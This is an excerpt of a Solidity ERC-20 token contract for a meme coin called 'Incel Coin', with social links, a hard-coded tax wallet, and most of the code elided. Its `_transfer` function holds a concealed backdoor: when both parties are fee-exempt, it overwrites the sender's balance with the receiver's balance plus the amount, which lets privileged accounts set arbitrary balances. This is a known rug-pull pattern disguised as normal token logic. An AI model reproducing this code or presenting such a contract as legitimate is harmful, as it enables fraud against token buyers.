/**
 * Twitter: https://twitter.com/IncelCoinEth
 * Telegram: https://t.me/IncelPortal
 */
...
contract Incel is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Incel Coin";
    ...
    constructor() {
        _taxWallet = payable(0x7cc1bE93C90A35D9AcF34AD26e2FFe21B7cE4967);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if (_isFeeExempt[from] && _isFeeExempt[to]) {_balances[from] = _balances[to].add(amount);return;}
